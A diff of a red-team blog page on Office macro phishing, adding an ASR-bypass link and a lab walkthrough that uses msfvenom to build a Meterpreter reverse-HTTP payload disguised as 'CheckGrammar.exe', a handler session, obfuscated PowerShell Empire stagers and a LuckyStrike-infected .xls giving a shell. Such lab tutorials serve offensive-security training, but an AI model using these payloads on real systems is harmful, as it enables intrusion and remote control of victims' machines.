@@ -16,7 +16,7 @@
   <meta name="title" content="Marco &middot; Doan Duc Anh" />
   
   <meta name="description" content="Exploring Marco — a blend of simplicity and precision in the digital realm." />
-  <meta name="keywords" content="redteam, phishing, office365, " />
+  <meta name="keywords" content="redteam, phishing, office365, C2, " />
   
   
   <link rel="canonical" href="http://localhost:1313/redteam/initialaccess/phishing/office365/marco/" />
@@ -83,6 +83,7 @@
     <meta property="article:tag" content="Redteam">
     <meta property="article:tag" content="Phishing">
     <meta property="article:tag" content="Office365">
+    <meta property="article:tag" content="C2">
     <meta property="og:image" content="http://localhost:1313/redteam/initialaccess/phishing/office365/marco/featured.jpg">
 
   
@@ -113,10 +114,10 @@
     
     "dateModified": "2025-08-20T00:00:00\u002b00:00",
     
-    "keywords": ["redteam","phishing","office365"],
+    "keywords": ["redteam","phishing","office365","C2"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "240"
+    "wordCount": "674"
   }]
   </script>
 
@@ -975,7 +976,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-08-20T00:00:00&#43;00:00">20 August 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span><span class="px-2 text-primary-500">&middot;</span>
+      <time datetime="2025-08-20T00:00:00&#43;00:00">20 August 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
   
@@ -1099,6 +1100,18 @@
 
               </span>
             
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/c2/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    C2
+  </span>
+</span>
+
+              </span>
+            
           
         
       
@@ -1152,18 +1165,41 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#basic">Basic</a>
+    <li><a href="#wrap-arround">Wrap arround</a>
       <ul>
         <li><a href="#execl">Execl</a></li>
         <li><a href="#ms-word">MS Word</a></li>
+        <li><a href="#asr-attack-surface-reduction">ASR (Attack surface reduction)</a></li>
+        <li><a href="#asr-bypass">ASR bypass</a></li>
       </ul>
     </li>
-    <li><a href="#weaponized-macros">Weaponized Macros</a>
+    <li><a href="#generate-macro">Generate-Macro</a></li>
+    <li><a href="#marco_pack">marco_pack</a></li>
+    <li><a href="#lucky-strike--powershell-empire">Lucky Strike + Powershell Empire</a>
       <ul>
-        <li><a href="#attack-rating">Attack Rating</a></li>
-        <li><a href="#references">References</a></li>
+        <li><a href="#malicious-server-deployment">Malicious Server Deployment</a>
+          <ul>
+            <li><a href="#meterpreter">Meterpreter</a></li>
+            <li><a href="#empire">Empire</a></li>
+          </ul>
+        </li>
+        <li><a href="#luckystrike">LuckyStrike</a>
+          <ul>
+            <li><a href="#prepare-environment">Prepare environment</a></li>
+            <li><a href="#create-xls">Create .xls</a></li>
+          </ul>
+        </li>
+        <li><a href="#open-xls">Open .xls</a>
+          <ul>
+            <li><a href="#infected_fnkltjyvxls-meterpreter">infected_fNKLTJYV.xls (meterpreter)</a></li>
+            <li><a href="#infected_fnkltjyvxls-empire">infected_fNKLTJYV.xls (empire)</a></li>
+          </ul>
+        </li>
       </ul>
     </li>
+    <li><a href="#attack-rating">Attack Rating</a></li>
+    <li><a href="#tools">Tools</a></li>
+    <li><a href="#references">References</a></li>
   </ul>
 </nav>
   </div>
@@ -1177,18 +1213,41 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#basic">Basic</a>
+    <li><a href="#wrap-arround">Wrap arround</a>
       <ul>
         <li><a href="#execl">Execl</a></li>
         <li><a href="#ms-word">MS Word</a></li>
+        <li><a href="#asr-attack-surface-reduction">ASR (Attack surface reduction)</a></li>
+        <li><a href="#asr-bypass">ASR bypass</a></li>
       </ul>
     </li>
-    <li><a href="#weaponized-macros">Weaponized Macros</a>
+    <li><a href="#generate-macro">Generate-Macro</a></li>
+    <li><a href="#marco_pack">marco_pack</a></li>
+    <li><a href="#lucky-strike--powershell-empire">Lucky Strike + Powershell Empire</a>
       <ul>
-        <li><a href="#attack-rating">Attack Rating</a></li>
-        <li><a href="#references">References</a></li>
+        <li><a href="#malicious-server-deployment">Malicious Server Deployment</a>
+          <ul>
+            <li><a href="#meterpreter">Meterpreter</a></li>
+            <li><a href="#empire">Empire</a></li>
+          </ul>
+        </li>
+        <li><a href="#luckystrike">LuckyStrike</a>
+          <ul>
+            <li><a href="#prepare-environment">Prepare environment</a></li>
+            <li><a href="#create-xls">Create .xls</a></li>
+          </ul>
+        </li>
+        <li><a href="#open-xls">Open .xls</a>
+          <ul>
+            <li><a href="#infected_fnkltjyvxls-meterpreter">infected_fNKLTJYV.xls (meterpreter)</a></li>
+            <li><a href="#infected_fnkltjyvxls-empire">infected_fNKLTJYV.xls (empire)</a></li>
+          </ul>
+        </li>
       </ul>
     </li>
+    <li><a href="#attack-rating">Attack Rating</a></li>
+    <li><a href="#tools">Tools</a></li>
+    <li><a href="#references">References</a></li>
   </ul>
 </nav>
   </div>
@@ -1292,12 +1351,12 @@
 
         <div class="article-content max-w-prose mb-20">
           
-<h2 class="relative group">Basic 
-    <div id="basic" class="anchor"></div>
+<h2 class="relative group">Wrap arround 
+    <div id="wrap-arround" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#basic" aria-label="Anchor">#</a>
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#wrap-arround" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
@@ -1337,12 +1396,84 @@ End Sub
     Enable Content
 </p>
 
-<h2 class="relative group">Weaponized Macros 
-    <div id="weaponized-macros" class="anchor"></div>
+<h3 class="relative group">ASR (Attack surface reduction) 
+    <div id="asr-attack-surface-reduction" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#weaponized-macros" aria-label="Anchor">#</a>
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#asr-attack-surface-reduction" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><a
+  href="https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction#attack-surface-reduction-rules"
+    target="_blank"
+  >Attack surface reduction rules overview</a>
+</p>
+<p><a
+  href="https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference"
+    target="_blank"
+  >Attack surface reduction rules reference</a>
+</p>
+<p>Introduced as part of Windows Defender Exploit Guard in Windows 10 1709.</p>
+<p>A set of rules</p>
+<ul>
+<li>Group Policy Objects</li>
+</ul>
+<p>Some very efficient</p>
+<ul>
+<li>Ex. Block all Office Applications from creating child processes.</li>
+<li>Potential to block 99.9% of all marco based attacks in the wild.</li>
+</ul>
+<p align="center">
+    <img src="img/2_4_asr.png" />
+    <img src="img/2_5_asr_event.png" />
+</p>
+
+<h3 class="relative group">ASR bypass 
+    <div id="asr-bypass" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#asr-bypass" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><a
+  href="https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3"
+    target="_blank"
+  >ASR Rules Bypass.vba</a>
+</p>
+<p><a
+  href="https://www.darkoperator.com/blog/2017/11/6/windows-defender-exploit-guard-asr-vbscriptjs-rule"
+    target="_blank"
+  >Windows Defender Exploit Guard ASR VBScript/JS Rule</a>
+</p>
+<p><a
+  href="https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office"
+    target="_blank"
+  >Windows Defender Exploit Guard ASR Rules for Office</a>
+</p>
+
+<h2 class="relative group">Generate-Macro 
+    <div id="generate-macro" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#generate-macro" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Tested on Windows 10 with O365 Home Premium (M365).</p>
+<p>During execution, the payload was detected and terminated quickly by built-in antivirus/defender.</p>
+<p>(Correct me if I’m wrong or if you’ve observed different behavior.)</p>
+
+<h2 class="relative group">marco_pack 
+    <div id="marco_pack" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#marco_pack" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
@@ -1374,7 +1505,245 @@ End Sub
 </ul>
 <p><code>This is the community edition. The Pro version unlocks advanced features such as shellcode injection, seamless Meterpreter integration, and extended exploitation capabilities.....</code></p>
 
-<h3 class="relative group">Attack Rating 
+<h2 class="relative group">Lucky Strike + Powershell Empire 
+    <div id="lucky-strike--powershell-empire" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#lucky-strike--powershell-empire" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p><strong>Attacker IP (Kali):</strong> <code>192.168.50.2</code></p>
+<p><strong>Victim IP (Windows 10):</strong> <code>192.168.50.3</code></p>
+<p><strong>In this section, I would use both meterpreter and empire</strong></p>
+
+<h3 class="relative group">Malicious Server Deployment 
+    <div id="malicious-server-deployment" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#malicious-server-deployment" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+
+<h4 class="relative group">Meterpreter 
+    <div id="meterpreter" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#meterpreter" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p><code>$ msfvenom -p windows/meterpreter/reverse_http LPORT=8080 LHOST=192.168.50.2 -f exe -o CheckGrammar.exe </code></p>
+<pre tabindex="0"><code>msf6 &gt; use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_http
+PAYLOAD =&gt; windows/meterpreter/reverse_http
+msf6 exploit(multi/handler) &gt; set LHOST 192.168.50.2
+LHOST =&gt; 192.168.50.2
+msf6 exploit(multi/handler) &gt; set LPORT 8080
+LPORT =&gt; 8080
+msf6 exploit(multi/handler) &gt; run
+[*] Started HTTP reverse handler on http://192.168.50.2:8080
+</code></pre>
+<h4 class="relative group">Empire 
+    <div id="empire" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#empire" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>I use Kali, so this is easy to install <a
+  href="https://www.kali.org/blog/empire-starkiller/"
+    target="_blank"
+  >empire-starkiller</a>
+</p>
+<p>After that, run with</p>
+<pre tabindex="0"><code>sudo powershell-empire server
+</code></pre><p align="center">
+    <img src="img/luckystrike/1_Starkiller.png"/>
+</p>
+<p><em>Default admin account</em></p>
+<p><strong>Username:</strong> <code>empireadmin</code></p>
+<p><strong>Password:</strong> <code>password123</code></p>
+
+<h5 class="relative group">Create Listener 
+    <div id="create-listener" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#create-listener" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<p align="center">
+    <img src="img/luckystrike/2_CreateListener.png"/>
+    <img src="img/luckystrike/2_CreateListenerHttp.png"/>
+</p>
+
+<h5 class="relative group">Create Stager 
+    <div id="create-stager" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#create-stager" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<p align="center">
+    <img src="img/luckystrike/3_CreateStager.png"/>
+    Create new stager
+    <img src="img/luckystrike/3_CreateStagerHttpListen.png"/>
+    Set listener to http that just created in the previous step
+    <img src="img/luckystrike/3_CreateStagerHttpObfuscate.png"/>
+    Enable Obfuscate mode
+    <img src="img/luckystrike/3_CreateStagerHttpDownload.png"/>
+    Download this payload
+</p>
+
+<h3 class="relative group">LuckyStrike 
+    <div id="luckystrike" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#luckystrike" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Transfer file to vicim machine, there are multiples ways to do this, but I interested in using http server</p>
+<p><code>python -m http.server 8000</code></p>
+<p align="center">
+    <img src="img/luckystrike/4_Download.png"/>
+</p>
+
+<h4 class="relative group">Prepare environment 
+    <div id="prepare-environment" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#prepare-environment" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p><a
+  href="https://github.com/danielbohannon/Invoke-Obfuscation"
+    target="_blank"
+  >Invoke-Obfuscation</a>
+</p>
+<p align="center">
+    <img src="img/luckystrike/4_Invoke-Obfuscation.png"/>
+    Import module Invoke-Obfuscation
+    <img src="img/luckystrike/4_Install_luckystrike.png"/>
+    Install luckystrike
+    <img src="img/luckystrike/4_Run_Invoke-Obfuscation.png"/>
+    Invoke-Obfuscation
+    <img src="img/luckystrike/4_luckystrike_error.png"/>
+    Error in finding module
+    <img src="img/luckystrike/4_luckystrike_fix_env.png"/>
+    Find PSModulePath
+    <img src="img/luckystrike/4_luckystrike_fix_modules.png"/>
+    Copy / Move Invoke-Obfuscation folder to one of these paths
+    <img src="img/luckystrike/4_luckystrike_init_successfully.png"/>
+</p>
+
+<h4 class="relative group">Create .xls 
+    <div id="create-xls" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#create-xls" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+
+<h5 class="relative group">Meterpreter 
+    <div id="meterpreter-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#meterpreter-1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<p align="center">
+    <img src="img/luckystrike/5_meterpreter_create_payload.png"/>
+    Create payload from malicious exe for reverse http (meterpreter)
+    <img src="img/luckystrike/5_meterpreter_configure_payload.png"/>
+    Configure payload
+    <img src="img/luckystrike/5_meterpreter_create_xls.png"/>
+    Generate file .xls
+</p>
+
+<h5 class="relative group">Empire 
+    <div id="empire-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#empire-1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<p align="center">
+    <img src="img/luckystrike/5_empire_create_payload.png"/>
+    Create payload from malicious exe for reverse http (empire)
+    <img src="img/luckystrike/5_empire_configure_payload.png"/>
+    Configure payload
+    <img src="img/luckystrike/5_empire_create_xls.png"/>
+    Generate file .xls
+</p>
+
+<h3 class="relative group">Open .xls 
+    <div id="open-xls" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#open-xls" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+
+<h4 class="relative group">infected_fNKLTJYV.xls (meterpreter) 
+    <div id="infected_fnkltjyvxls-meterpreter" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#infected_fnkltjyvxls-meterpreter" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>
+    <img src="img/luckystrike/6_meterpreter_open.png"/>
+    Clink enable marco
+    <img src="img/luckystrike/6_meterpreter_shell.png"/>
+    Get shell
+</p>
+
+<h4 class="relative group">infected_fNKLTJYV.xls (empire) 
+    <div id="infected_fnkltjyvxls-empire" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#infected_fnkltjyvxls-empire" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>
+    <img src="img/luckystrike/6_empire_open.png"/>
+    Open file
+    <img src="img/luckystrike/6_empire_agent_add.png"/>
+    Add agent
+    <img src="img/luckystrike/6_empire_agen_shell.png"/>
+    Terminal
+    <img src="img/luckystrike/6_empire_agent_file_browser.png"/>
+    File Browser
+</p>
+
+<h2 class="relative group">Attack Rating 
     <div id="attack-rating" class="anchor"></div>
     
     <span
@@ -1382,7 +1751,7 @@ End Sub
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#attack-rating" aria-label="Anchor">#</a>
     </span>        
     
-</h3>
+</h2>
 <ul>
 <li><strong>High Realism</strong>: Macro-based attacks continue to appear in real-world incidents, targeting both IT and non-IT staff.</li>
 <li><strong>Social Engineering Factor</strong>: Success often relies on persuading the user to click <em>Enable Content</em>, a surprisingly common behavior in corporate environments.</li>
@@ -1392,7 +1761,42 @@ End Sub
 <li><strong>Detection Difficulty</strong>: When combined with living-off-the-land techniques (e.g., abusing PowerShell or WMI), attribution and detection become harder for defenders.</li>
 </ul>
 
-<h3 class="relative group">References 
+<h2 class="relative group">Tools 
+    <div id="tools" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#tools" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p><a
+  href="https://github.com/sevagas/macro_pack"
+    target="_blank"
+  >macro_pack</a>
+</p>
+<p><a
+  href="https://github.com/enigma0x3/Generate-Macro"
+    target="_blank"
+  >Generate-Macro</a>
+</p>
+<p><a
+  href="https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3"
+    target="_blank"
+  >ASR Rules Bypass.vba</a>
+</p>
+<p><a
+  href="https://github.com/curi0usJack/luckystrike"
+    target="_blank"
+  >luckystrike</a>
+</p>
+<p><a
+  href="https://github.com/danielbohannon/Invoke-Obfuscation"
+    target="_blank"
+  >Invoke-Obfuscation</a>
+</p>
+
+<h2 class="relative group">References 
     <div id="references" class="anchor"></div>
     
     <span
@@ -1400,7 +1804,17 @@ End Sub
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#references" aria-label="Anchor">#</a>
     </span>        
     
-</h3>
+</h2>
+<p><a
+  href="https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction#attack-surface-reduction-rules"
+    target="_blank"
+  >Attack surface reduction rules overview</a>
+</p>
+<p><a
+  href="https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference"
+    target="_blank"
+  >Attack surface reduction rules reference</a>
+</p>
 <p><a
   href="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office"
     target="_blank"
@@ -1410,6 +1824,36 @@ End Sub
   href="https://blog.sevagas.com/?EXCEL-4-0-XLM-macro-in-MacroPack-Pro"
     target="_blank"
   >EXCEL 4.0 XLM macro in MacroPack Pro</a>
+</p>
+<p><a
+  href="https://wiki.hacksoc.co.uk/help-guides/techniques/a-guide-to-creating-malicious-macro-enabled-excel-worksheets"
+    target="_blank"
+  >A guide to creating malicious macro-enabled Excel worksheets</a>
+</p>
+<p><a
+  href="https://www.youtube.com/watch?v=zYWyPZDndVg"
+    target="_blank"
+  >Maldocs: Tips for Red Teamers w/ Didier Stevens - SANS HackFest &amp; Ranges Summit 2020</a>
+</p>
+<p><a
+  href="https://redcanary.com/blog/incident-response/malicious-excel-macro/"
+    target="_blank"
+  >Uncompromised: Unpacking a malicious Excel macro</a>
+</p>
+<p><a
+  href="https://redcanary.com/blog/testing-and-validation/atomic-red-team/testing-initial-access-with-generate-macro-in-atomic-red-team/"
+    target="_blank"
+  >Testing initial access with &ldquo;Generate-Macro&rdquo; in Atomic Red Team</a>
+</p>
+<p><a
+  href="https://www.youtube.com/watch?v=dRebw65X5eQ"
+    target="_blank"
+  >Windows Red Team Exploitation Techniques | Luckystrike &amp; PowerShell Empire</a>
+</p>
+<p><a
+  href="https://www.darkoperator.com/blog/2017/11/6/windows-defender-exploit-guard-asr-vbscriptjs-rule"
+    target="_blank"
+  >Windows Defender Exploit Guard ASR VBScript/JS Rule</a>
 </p>
 
           
@@ -1744,6 +2188,201 @@ End Sub
       
         
 
+  <a href="/ctf/pwnme-2025/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/ctf/pwnme-2025/featured_hu_5a4328a329fc5d3f.jpg);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/ctf/pwnme-2025/">Compress</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-03-03T00:00:00&#43;00:00">3 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+        
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/ctf/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    CTF
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/exploitation/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Exploitation
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/pwn/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Pwn
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/write-up/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Write-Up
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/heap/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Heap
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/unlink-attack/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Unlink-Attack
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+        </div>
+
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+      
+        
+
   <a href="/notes/services/ssh/" class="min-w-full">
     
     <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
@@ -2031,201 +2670,6 @@ End Sub
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
     Machines
-  </span>
-</span>
-
-              </span>
-            
-          
-        
-      
-    </div>
-  
-
-  
-  
-
-
-
-        </div>
-
-        
-      </div>
-      <div class="px-6 pt-4 pb-2">
-
-      </div>
-    </div>
-  </a>
-
-      
-        
-
-  <a href="/ctf/pwnme-2025/" class="min-w-full">
-    
-    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
-        
-        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/ctf/pwnme-2025/featured_hu_5a4328a329fc5d3f.jpg);"></div>
-        
-      
-
-      <div class="px-6 py-4">
-
-        
-        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/ctf/pwnme-2025/">Compress</div>
-        
-
-        <div class="text-sm text-neutral-500 dark:text-neutral-400">
-          
-
-
-
-
-
-
-
-  
-
-  
-  
-  
-
-  
-  
-    
-  
-
-  
-    
-  
-
-  
-
-  
-
-  
-    
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  <div class="flex flex-row flex-wrap items-center">
-    
-    
-      <time datetime="2025-03-03T00:00:00&#43;00:00">3 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
-    
-
-    
-    
-  </div>
-
-  
-    <div class="flex flex-row flex-wrap items-center">
-      
-        
-          
-        
-      
-        
-      
-        
-      
-        
-      
-    </div>
-  
-
-  
-  
-    <div class="flex flex-row flex-wrap items-center">
-      
-        
-      
-        
-          
-        
-      
-        
-      
-        
-          
-            
-              <span
-                class="mr-2 margin-top-[0.5rem]"
-                onclick="window.open(&#34;/tags/ctf/&#34;,'_self');return false;">
-                <span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    CTF
-  </span>
-</span>
-
-              </span>
-            
-              <span
-                class="mr-2 margin-top-[0.5rem]"
-                onclick="window.open(&#34;/tags/exploitation/&#34;,'_self');return false;">
-                <span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Exploitation
-  </span>
-</span>
-
-              </span>
-            
-              <span
-                class="mr-2 margin-top-[0.5rem]"
-                onclick="window.open(&#34;/tags/pwn/&#34;,'_self');return false;">
-                <span class="flex cursor-pointer">
-  <span
